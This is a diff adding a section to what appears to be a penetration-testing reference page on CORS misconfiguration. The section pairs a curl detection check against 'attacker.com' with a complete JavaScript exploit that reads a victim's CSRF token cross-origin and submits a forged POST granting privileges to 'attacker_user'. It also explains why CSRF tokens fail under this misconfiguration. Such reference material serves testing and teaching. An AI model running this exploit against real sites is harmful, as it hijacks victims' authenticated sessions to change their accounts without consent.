@@ -181,6 +181,52 @@ python3 corsy.py -u https://target.com -t 10
 # Vulnerable if: Access-Control-Allow-Credentials: true
 #            AND: Access-Control-Allow-Origin matches your injected origin</code></pre>
 
+<h2>Bypassing CSRF Tokens via CORS Misconfiguration</h2>
+<p>If a CORS misconfiguration reflects arbitrary origins in <code>Access-Control-Allow-Origin</code> <em>and</em> sets <code>Access-Control-Allow-Credentials: true</code>, the Same-Origin policy is effectively bypassed. An attacker can read cross-origin responses — including pages containing CSRF tokens — and embed those tokens in forged requests. The session cookie must also have <code>SameSite=None</code> for this to work.</p>
+
+<h3>Pre-conditions</h3>
+<ul>
+  <li><code>Access-Control-Allow-Credentials: true</code></li>
+  <li><code>Access-Control-Allow-Origin</code> reflects arbitrary attacker-controlled origin</li>
+  <li>Session cookie set with <code>SameSite=None; Secure</code></li>
+</ul>
+
+<h3>Detection</h3>
+<pre><code># Test if origin is reflected
+curl -H "Origin: https://attacker.com" -I https://target.com/profile.php
+# Vulnerable if response contains:
+# Access-Control-Allow-Origin: https://attacker.com
+# Access-Control-Allow-Credentials: true
+
+# Check cookie attributes:
+# Set-Cookie: session=...; SameSite=None; Secure  ← required for browser to send cookie cross-origin</code></pre>
+
+<h3>Exploit — Steal CSRF Token and Submit Forged Request</h3>
+<pre><code>&lt;!-- Host this on attacker origin. Victim visits the page. --&gt;
+&lt;script&gt;
+    // Step 1: Cross-origin GET to the page containing the CSRF token
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://target.com/profile.php', false);  // synchronous
+    xhr.withCredentials = true;   // sends victim's session cookie
+    xhr.send();
+
+    // Step 2: Parse response and extract CSRF token
+    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
+    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);
+
+    // Step 3: Submit the state-changing request with valid CSRF token
+    var csrf_req = new XMLHttpRequest();
+    var params = 'promote=attacker_user&amp;csrf=' + csrftoken;
+    csrf_req.open('POST', 'https://target.com/profile.php', false);
+    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    csrf_req.withCredentials = true;
+    csrf_req.send(params);
+    // Result: victim's session submits a valid CSRF-protected POST on attacker's behalf
+&lt;/script&gt;</code></pre>
+
+<h3>Why CSRF Tokens Fail Here</h3>
+<p>CSRF tokens are designed assuming an attacker cannot read cross-origin responses (enforced by the Same-Origin policy). When CORS is misconfigured with <code>Allow-Credentials: true</code> and arbitrary origin reflection, the attacker <em>can</em> read the response — making the token readable before the forged request is sent. The token is valid because it was fetched from the victim's own session.</p>
+
 <h2>Resources</h2>
 <ul>
   <li>PayloadsAllTheThings — CORS Misconfiguration — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
